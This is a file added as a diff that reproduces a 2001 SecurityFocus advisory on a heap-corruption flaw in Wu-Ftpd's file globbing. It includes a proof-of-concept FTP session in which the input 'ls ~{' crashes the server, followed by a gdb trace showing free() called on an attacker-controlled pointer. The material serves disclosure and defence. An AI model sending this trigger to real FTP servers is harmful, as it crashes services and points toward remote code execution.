@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/3581/info
+
+Wu-Ftpd is an FTP server based on the BSD 'ftpd' that is maintained by Washington University.
+
+Wu-Ftpd allows clients to organize files for FTP actions based on "file globbing" patterns. File globbing is also used by various shells. The implementation of file globbing included in Wu-Ftpd contains a heap-corruption vulnerability that may allow an attacker to execute arbitrary code on a server remotely.
+
+This vulnerability was initially scheduled for public release on December 3, 2001. However, Red Hat has made details public as of November 27, 2001. As a result, we are forced to warn other users of the vulnerable product so that they may take appropriate actions. 
+
+ftp> open localhost
+Connected to localhost (127.0.0.1).
+220 sasha FTP server (Version wu-2.6.1-18) ready.
+Name (localhost:root): anonymous
+331 Guest login ok, send your complete e-mail address as password.
+Password:
+230 Guest login ok, access restrictions apply.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls ~{
+227 Entering Passive Mode (127,0,0,1,241,205)
+421 Service not available, remote server has closed connection
+
+1405 ? S 0:00 ftpd: accepting connections on port 21
+7611 tty3 S 1:29 gdb /usr/sbin/wu.ftpd
+26256 ? S 0:00 ftpd: sasha:anonymous/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+26265 tty3 R 0:00 bash -c ps ax | grep ftpd
+(gdb) at 26256
+Attaching to program: /usr/sbin/wu.ftpd, process 26256
+Symbols already loaded for /lib/libcrypt.so.1
+Symbols already loaded for /lib/libnsl.so.1
+Symbols already loaded for /lib/libresolv.so.2
+Symbols already loaded for /lib/libpam.so.0
+Symbols already loaded for /lib/libdl.so.2
+Symbols already loaded for /lib/i686/libc.so.6
+Symbols already loaded for /lib/ld-linux.so.2
+Symbols already loaded for /lib/libnss_files.so.2
+Symbols already loaded for /lib/libnss_nisplus.so.2
+Symbols already loaded for /lib/libnss_nis.so.2
+0x40165544 in __libc_read () from /lib/i686/libc.so.6
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+__libc_free (mem=0x61616161) at malloc.c:3136
+3136 in malloc.c
